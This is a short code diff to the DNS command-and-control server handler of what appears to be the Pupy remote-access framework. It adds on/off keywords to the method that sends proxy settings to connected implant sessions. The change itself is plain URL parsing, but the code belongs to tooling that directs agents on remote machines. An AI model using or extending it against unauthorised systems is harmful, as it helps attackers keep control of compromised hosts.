@@ -52,15 +52,26 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
         return self.add_command(Exit(), session=node, default=default)
 
     def proxy(self, uri, node=None, default=False):
+        if not uri or uri.lower() in ('none', 'off', 'no', 'disable'):
+            return self.add_command(
+                SetProxy('none', '0.0.0.0', 0),
+                session=node, default=default
+            )
+        elif uri.lower() in ('on', 'enable', 'yes'):
+            return self.add_command(
+                SetProxy('any', '0.0.0.0', 0),
+                session=node, default=default
+            )
+
         if not '://' in uri:
             uri = 'http://' + uri
 
         parsed = urlparse(uri)
         return self.add_command(
             SetProxy(
-                scheme=parsed.scheme,
-                ip=parsed.hostname,
-                port=parsed.port or 3128,
+                parsed.scheme,
+                parsed.hostname,
+                parsed.port or 3128,
                 user=parsed.username,
                 password=parsed.password
             ),
